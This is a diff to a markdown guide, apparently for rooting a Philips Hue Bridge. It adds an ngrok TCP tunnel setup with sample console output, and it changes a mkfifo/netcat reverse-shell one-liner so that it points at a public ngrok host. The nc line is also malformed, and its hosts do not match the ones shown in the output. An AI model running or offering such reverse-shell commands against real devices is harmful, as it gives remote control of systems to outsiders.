@@ -49,12 +49,33 @@ reboot
 ```
 
 ### Setting up Ngrok
-#TODO
+```
+ngrok tcp 443
+```
 
+and we get something like this:
+
+```
+ngrok
+                                   
+🚪 One gateway for every AI model. Available in early access *now*: https://ngrok.com/r/ai                                       
+                                        
+Session Status                online                                                                   
+Account                       User account (Plan: Free)                                    
+Update                        update available (version 3.35.0, Ctrl-U to update)            
+Version                       3.34.1
+Region                        Europe (eu)                                    
+Latency                       25ms                               
+Web Interface                 http://127.0.0.1:4040                                      
+Forwarding                    tcp://6.tcp.eu.ngrok.io:18182 -> localhost:443                                                                                                                                                                
+                     
+Connections                   ttl     opn     rt1     rt5     p50     p90                                                                        
+                              0       0       0.00    0.00    0.00    0.00      
+```
 #### On the attacher machine
 
 #### On the Philips Hue Bridge
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.1.2 443 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 6.tcp.eu.ngrok.io:18182 443 >/tmp/f
 
 4.tcp.eu.ngrok.io:17055
 ### Connect to the philips HUE
